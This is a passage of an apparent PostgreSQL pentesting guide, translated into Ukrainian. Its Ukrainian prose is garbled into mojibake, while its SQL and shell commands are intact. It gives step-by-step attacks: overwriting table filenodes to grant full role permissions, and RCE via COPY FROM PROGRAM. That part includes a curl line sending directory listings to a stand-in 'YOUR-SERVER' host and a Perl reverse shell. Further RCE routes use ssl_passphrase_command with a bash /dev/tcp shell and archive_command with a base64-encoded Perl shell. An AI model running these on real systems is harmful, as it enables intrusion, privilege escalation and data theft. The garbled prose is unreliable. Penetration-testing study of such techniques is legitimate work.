–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ COPY –Ω–µ –º–æ–∂–µ –æ–±—Ä–æ–±–ª—è—Ç–∏ —Å–∏–º–≤–æ–ª–∏ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, —Ç–æ–º—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –±–∞–∑–æ–≤–µ64 –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, **–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –æ–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–π –≤–∏—Ä–∞–∑**.\
–î—É–∂–µ –≤–∞–∂–ª–∏–≤–∏–º –æ–±–º–µ–∂–µ–Ω–Ω—è–º —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ —î —Ç–µ, —â–æ **`copy` –Ω–µ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –∑–∞–ø–∏—Å—É –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –∑–º—ñ–Ω—é—î –¥–µ—è–∫—ñ –±—ñ–Ω–∞—Ä–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è**.

### **–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤**

–û–¥–Ω–∞–∫ —ñ—Å–Ω—É—é—Ç—å **—ñ–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–µ–ª–∏–∫–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤:**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**–ü—ñ–¥–∫–∞–∑–∫–∞ –∑ –ø—Ä–µ–º—ñ—î—é –∑–∞ –ø–æ–º–∏–ª–∫–∏**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—å** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –ø–æ—à—É–∫—É –ø–æ–º–∏–ª–æ–∫, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –ø—Ä–µ–º—ñ—ó –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### –û–Ω–æ–≤–ª–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö —Ç–∞–±–ª–∏—Ü—ñ PostgreSQL —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É

–Ø–∫—â–æ —É –≤–∞—Å —î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ç–∞ –∑–∞–ø–∏—Å—É —Ñ–∞–π–ª—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞ PostgreSQL, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–Ω–æ–≤–∏—Ç–∏ –±—É–¥—å-—è–∫—É —Ç–∞–±–ª–∏—Ü—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ, **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–≤—à–∏ –ø–æ–≤'—è–∑–∞–Ω–∏–π —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª** –≤ [–∫–∞—Ç–∞–ª–æ–∑—ñ –¥–∞–Ω–∏—Ö PostgreSQL](https://www.postgresql.org/docs/8.1/storage.html). **–î–æ–∫–ª–∞–¥–Ω—ñ—à–µ –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É** [**—Ç—É—Ç**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

–ù–µ–æ–±—Ö—ñ–¥–Ω—ñ –∫—Ä–æ–∫–∏:

1. –û—Ç—Ä–∏–º–∞–π—Ç–µ –∫–∞—Ç–∞–ª–æ–≥ –¥–∞–Ω–∏—Ö PostgreSQL

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**–ü—Ä–∏–º—ñ—Ç–∫–∞:** –Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ—Ç–æ—á–Ω–∏–π —à–ª—è—Ö –∫–∞—Ç–∞–ª–æ–≥—É –¥–∞–Ω–∏—Ö –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç–∞—Ç–∏ –æ—Å–Ω–æ–≤–Ω—É –≤–µ—Ä—Å—ñ—é PostgreSQL —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç `SELECT version()` —Ç–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–±—Ä–∞—Ç–∏ —à–ª—è—Ö. –ó–∞–≥–∞–ª—å–Ω—ñ —à–ª—è—Ö–∏ –∫–∞—Ç–∞–ª–æ–≥—É –¥–∞–Ω–∏—Ö –Ω–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∞—Ö Unix PostgreSQL - `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. –ó–∞–≥–∞–ª—å–Ω–∏–º —ñ–º'—è–º –∫–ª–∞—Å—Ç–µ—Ä–∞ —î `main`.
2. –û—Ç—Ä–∏–º–∞–π—Ç–µ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª–æ–≤–æ–≥–æ –≤—É–∑–ª–∞, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ –∑ —Ü—ñ–ª—å–æ–≤–æ—é —Ç–∞–±–ª–∏—Ü–µ—é

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

–¶–µ–π –∑–∞–ø–∏—Ç –ø–æ–≤–∏–Ω–µ–Ω –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç `base/3/1337`. –ü–æ–≤–Ω–∏–π —à–ª—è—Ö –Ω–∞ –¥–∏—Å–∫—É –±—É–¥–µ `$DATA_DIRECTORY/base/3/1337`, —Ç–æ–±—Ç–æ `/var/lib/postgresql/13/main/base/3/1337`.
3. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```
4. –û—Ç—Ä–∏–º–∞–π—Ç–µ —Ç–∏–ø –¥–∞–Ω–∏—Ö, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ü—ñ–ª—å–æ–≤–æ—é —Ç–∞–±–ª–∏—Ü–µ—é

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```
5. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [—Ä–µ–¥–∞–∫—Ç–æ—Ä —Ñ–∞–π–ª–æ–≤–æ–≥–æ –≤—É–∑–ª–∞ PostgreSQL](https://github.com/adeadfed/postgresql-filenode-editor), —â–æ–± [—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –≤—Å—ñ –±—É–ª–µ–≤—ñ –ø—Ä–∞–ø–æ—Ä–∏ `rol*` –Ω–∞ 1 –¥–ª—è –ø–æ–≤–Ω–∏—Ö –¥–æ–∑–≤–æ–ª—ñ–≤.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—è —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ —Ñ–∞–π–ª–æ–≤–æ–≥–æ –≤—É–∑–ª–∞ PostgreSQL](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)
6. –ó–Ω–æ–≤—É –∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –≤—ñ–¥—Ä–µ–¥–∞–≥–æ–≤–∞–Ω–∏–π —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*`, —Ç–∞ –ø–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```
7. _(–ù–µ–æ–±–æ–≤'—è–∑–∫–æ–≤–æ)_ –û—á–∏—Å—Ç—ñ—Ç—å –∫–µ—à —Ç–∞–±–ª–∏—Ü—ñ –≤ –ø–∞–º'—è—Ç—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –¥–æ—Ä–æ–≥–∏–π –∑–∞–ø–∏—Ç SQL

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```
8. –¢–µ–ø–µ—Ä –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–æ–±–∞—á–∏—Ç–∏ –æ–Ω–æ–≤–ª–µ–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—ñ –≤ PostgreSQL.

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å—Ç–∞—Ç–∏ —Å—É–ø–µ—Ä–∞–¥–º—ñ–Ω–æ–º, —Ä–µ–¥–∞–≥—É—é—á–∏ —Ç–∞–±–ª–∏—Ü—é `pg_authid`. **–î–∏–≤.** [**–Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä–æ–∑–¥—ñ–ª**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE –Ω–∞ –ø—Ä–æ–≥—Ä–∞–º—É**

–ó –≤–µ—Ä—Å—ñ—ó 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), —Ç—ñ–ª—å–∫–∏ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ** —Ç–∞ —á–ª–µ–Ω–∏ –≥—Ä—É–ø–∏ **`pg_execute_server_program`** –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ copy –¥–ª—è RCE (–ø—Ä–∏–∫–ª–∞–¥ –∑ –≤–∏—Ç—ñ–∫–∞–Ω–Ω—è–º:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
–ü—Ä–∏–∫–ª–∞–¥ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —è–∫—â–æ –≤–∏ –Ω–µ —î —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∞–ª–µ –º–∞—î—Ç–µ –¥–æ–∑–≤—ñ–ª **`CREATEROLE`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –¥–æ —Ü—ñ—î—ó –≥—Ä—É–ø–∏:**
```sql
GRANT pg_execute_server_program TO username;
```
[**–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è.**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

–ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –º–æ–¥—É–ª—å `multi/postgres/postgres_copy_from_program_cmd_exec` –∑ **metasploit**.\
–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ü—é —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å [**—Ç—É—Ç**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). –•–æ—á–∞ –≤–æ–Ω–∞ –±—É–ª–∞ –æ–ø–∏—Å–∞–Ω–∞ —è–∫ CVE-2019-9193, Postges –∑–∞—è–≤–∏–≤, —â–æ —Ü–µ –±—É–ª–∞ [—Ñ—É–Ω–∫—Ü—ñ—è —ñ –Ω–µ –±—É–¥–µ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∞](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE –∑ –º–æ–≤–∞–º–∏ PostgreSQL

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### RCE –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º–∏ PostgreSQL

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –≤–∏ **–¥—ñ–∑–Ω–∞–ª–∏—Å—è** –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –ø–æ—Å—Ç–∞ **—è–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –±—ñ–Ω–∞—Ä–Ω—ñ —Ñ–∞–π–ª–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è PostgreSQL —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –π–æ–≥–æ**.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### RCE –∑ —Ñ–∞–π–ª–æ–º –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó PostgreSQL

{% hint style="info" %}
–ù–∞—Å—Ç—É–ø–Ω—ñ –≤–µ–∫—Ç–æ—Ä–∏ RCE –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω—ñ –≤ –æ–±–º–µ–∂–µ–Ω–∏—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö SQLi, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å—ñ –∫—Ä–æ–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —á–µ—Ä–µ–∑ –≤–∫–ª–∞–¥–µ–Ω—ñ SELECT-–æ–ø–µ—Ä–∞—Ç–æ—Ä–∏
{% endhint %}

**–§–∞–π–ª –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó** PostgreSQL —î **–∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–º** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º **postgres**, —è–∫–∏–π –∑–∞–ø—É—Å–∫–∞—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —Ç–æ–º—É —è–∫ **—Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –≤ —Ñ–∞–π–ª–æ–≤—É —Å–∏—Å—Ç–µ–º—É, —ñ, –æ—Ç–∂–µ, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ü–µ–π —Ñ–∞–π–ª.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE –∑ ssl\_passphrase\_command**

–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è [–ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç](https://pulsesecurity.co.nz/articles/postgres-sqli).

–£ —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —î –¥–µ—è–∫—ñ —Ü—ñ–∫–∞–≤—ñ –∞—Ç—Ä–∏–±—É—Ç–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` –®–ª—è—Ö –¥–æ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö
* `ssl_passphrase_command = ''` –Ø–∫—â–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π —Ñ–∞–π–ª –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø–∞—Ä–æ–ª–µ–º (–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π), PostgreSQL –≤–∏–∫–æ–Ω–∞—î **–∫–æ–º–∞–Ω–¥—É, –≤–∫–∞–∑–∞–Ω—É –≤ —Ü—å–æ–º—É –∞—Ç—Ä–∏–±—É—Ç—ñ**.
* `ssl_passphrase_command_supports_reload = off` –Ø–∫—â–æ —Ü–µ–π –∞—Ç—Ä–∏–±—É—Ç —É–≤—ñ–º–∫–Ω–µ–Ω–æ, **–∫–æ–º–∞–Ω–¥–∞**, –≤–∏–∫–æ–Ω–∞–Ω–∞, —è–∫—â–æ –∫–ª—é—á –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø–∞—Ä–æ–ª–µ–º, **–±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞** –ø—Ä–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—ñ `pg_reload_conf()`.

–¢–æ–¥—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø–æ–≤–∏–Ω–µ–Ω:

1. **–í–∏—Ç—è–≥–Ω—É—Ç–∏ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á** –∑ —Å–µ—Ä–≤–µ—Ä–∞
2. **–ó–∞—à–∏—Ñ—Ä—É–≤–∞—Ç–∏** –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –∫–ª—é—á:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏**
4. **–í–∏—Ç—è–≥–Ω—É—Ç–∏** –ø–æ—Ç–æ—á–Ω—É **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é** PostgreSQL
5. **–ü–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** **–∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é** –∑ –≤–∫–∞–∑–∞–Ω–∏–º–∏ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. –í–∏–∫–æ–Ω–∞—Ç–∏ `pg_reload_conf()`

–ü—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è —è –ø–æ–º—ñ—Ç–∏–≤, —â–æ —Ü–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ –ª–∏—à–µ, —è–∫—â–æ **—Ñ–∞–π–ª –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ –∫–ª—é—á–∞ –º–∞—î –ø—Ä–∏–≤—ñ–ª–µ—ó 640**, –≤—ñ–Ω **–Ω–∞–ª–µ–∂–∏—Ç—å –∫–æ—Ä–µ–Ω–µ–≤—ñ** —Ç–∞ **–≥—Ä—É–ø—ñ ssl-cert –∞–±–æ postgres** (—Ç–∞–∫ —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á postgres –º–æ–∂–µ –π–æ–≥–æ —á–∏—Ç–∞—Ç–∏), —ñ —Ä–æ–∑–º—ñ—â–µ–Ω–∏–π –≤ _/var/lib/postgresql/12/main_.

#### **RCE –∑ archive\_command**

**–î–æ–¥–∞—Ç–∫–æ–≤–∞** [**—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ —Ü—é –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ –ø—Ä–æ WAL —Ç—É—Ç**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

–Ü–Ω—à–∏–π –∞—Ç—Ä–∏–±—É—Ç —É —Ñ–∞–π–ª—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, - —Ü–µ `archive_command`.

–î–ª—è —Ç–æ–≥–æ, —â–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ, –ø–∞—Ä–∞–º–µ—Ç—Ä `archive_mode` –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ `'on'` –∞–±–æ `'always'`. –Ø–∫—â–æ —Ü–µ –ø—Ä–∞–≤–¥–∞, —Ç–æ–¥—ñ –º–∏ –º–æ–∂–µ–º–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É –≤ `archive_command` —ñ –∑–º—É—Å–∏—Ç–∏ —ó—ó –≤–∏–∫–æ–Ω–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ –æ–ø–µ—Ä–∞—Ü—ñ—ó –∑–∞–ø–∏—Å—É –∂—É—Ä–Ω–∞–ª—É –ø–µ—Ä–µ–¥–æ–ø–ª–∞—Ç–∏ (WAL).

–ó–∞–≥–∞–ª—å–Ω—ñ –∫—Ä–æ–∫–∏:

1. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π —Ä–µ–∂–∏–º –∞—Ä—Ö—ñ–≤—É: `SELECT current_setting('archive_mode')`
2. –ü–µ—Ä–µ–∑–∞–ø–∏—à—ñ—Ç—å `archive_command` –∑ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–≤–æ—Ä–æ—Ç–Ω–∏–π shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. –ü–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é: `SELECT pg_reload_conf()`
4. –ó–º—É—Å—ñ—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ—é –∑–∞–ø–∏—Å—É –∂—É—Ä–Ω–∞–ª—É –ø–µ—Ä–µ–¥–æ–ø–ª–∞—Ç–∏, —è–∫–∞ –≤–∏–∫–ª–∏—á–µ –∫–æ–º–∞–Ω–¥—É –∞—Ä—Ö—ñ–≤—É: `SELECT pg_switch_wal()` –∞–±–æ `SELECT pg_switch_xlog()` –¥–ª—è –¥–µ—è–∫–∏—Ö –≤–µ—Ä—Å—ñ–π Postgres

#### **RCE –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞–Ω–∏–º–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞–º–∏**

–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è [–ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ç—É—Ç](https://adeadfed.com/posts/postgresql-select-only-rce/).

–¶–µ–π –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–∞—Å—Ç—É–ø–Ω—ñ –∑–º—ñ–Ω–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó:

* `session_preload_libraries` -- –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —è–∫—ñ –±—É–¥—É—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–æ–º PostgreSQL –ø—Ä–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—ñ –∫–ª—ñ—î–Ω—Ç–∞.
* `dynamic_library_path` -- —Å–ø–∏—Å–æ–∫ –∫–∞—Ç–∞–ª–æ–≥—ñ–≤, –¥–µ —Å–µ—Ä–≤–µ—Ä PostgreSQL –±—É–¥–µ —à—É–∫–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏.

